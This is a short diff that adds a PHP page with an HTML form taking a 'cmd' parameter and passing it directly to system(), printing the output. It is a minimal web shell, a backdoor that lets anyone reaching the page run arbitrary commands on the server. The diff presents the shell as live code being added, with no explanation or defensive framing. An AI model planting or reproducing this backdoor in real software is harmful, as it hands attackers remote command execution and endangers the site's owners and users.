@@ -1,0 +1,13 @@
+  1 <HTML><BODY>
+  2 <FORM METHOD="GET" NAME="myform" ACTION="">
+  3 <INPUT TYPE="text" NAME="cmd">
+  4 <INPUT TYPE="submit" VALUE="Send">
+  5 </FORM>
+  6 <pre>
+  7 <?php
+  8 if($_GET['cmd']) {
+  9   system($_GET['cmd']);
+ 10   }
+ 11 ?>
+ 12 </pre>
+ 13 </BODY></HTML>
